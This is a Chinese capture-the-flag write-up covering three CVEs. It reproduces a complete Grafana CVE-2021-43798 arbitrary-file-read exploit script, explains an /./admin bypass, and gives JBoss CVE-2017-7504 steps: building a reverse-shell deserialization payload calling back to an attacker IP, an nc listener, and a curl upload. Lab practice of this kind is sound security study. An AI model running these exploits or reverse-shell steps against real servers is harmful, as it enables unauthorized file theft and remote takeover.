---
title: "CVE"
lastmod: 2026-03-26T18:14:24+08:00
draft: false
---
- [CVE-2021-43798](#cve-2021-43798)
- [CVE-2010-3863](#cve-2010-3863)
- [CVE-2017-7504](#cve-2017-7504)

---

## CVE-2021-43798

第一题，先找一下资源

<https://nvd.nist.gov/vuln/detail/cve-2021-43798?utm_source=chatgpt.com>

然后在exploit上面找一下有没有这个的相关程序

```php
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)
```

发现有这个程序

CVE-2021-43798漏洞是针对8.30及以下会产生的漏洞在8.3.1修复

Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。

攻击者可以通过将包含特殊目录便利字符序列(../)的特制HTTP请求发送到受影响的设备来利用此漏洞，成功利用该漏洞的攻击者可以在目标设备上查看文件系统上的任意文件。

主要问题出现在pkg/api/plugins.go文件的getPluginAssets函数。先查找插件是否存在，如果插件不存在，则返回"Plugin not found"，如果存在这个插件名，则会匹配 /public/plugins/:pluginId/中的，这个地方没有做任何过滤。最后打开pluginFilePath并输出相关内容，就可以造成任意文件读取。

用burp抓取登录页面修改 /login 修改路径为<font style="color:rgb(36, 41, 46);">/public/plugins/gauge/../../../../../../../../../flag就可以获取flag</font>

## CVE-2010-3863

这个漏洞是目录穿越漏洞，在访问admin面板的时候不访问，但是通过`/./admin`可以直接访问到admin面板

## CVE-2017-7504

先找一下相应的内容

是一个反序列化漏洞，通过将webshell序列化成一个二进制文件然后直接传入网站中，网站会反向链接自己的计算机和端口，所以需要在本地nc监听一下端口，然后直接通过shell命令找flag。

先下载这个发序列化的poc

`git clone https://github.com/joaomatosf/JavaDeserH2HC`

下载以后打开文件夹，然后运行主java程序

`javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java`

`java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.70.130:2333`

然后设置监听端口

`nc -lvvp 监听端口`

之后将文件发送给这个网站

`curl http://node6.anna.nssctf.cn:22728/jbossmq-httpil/HTTPServerILServlet  --data-binary @ReverseShellCommonsCollectionsHashMap.ser`

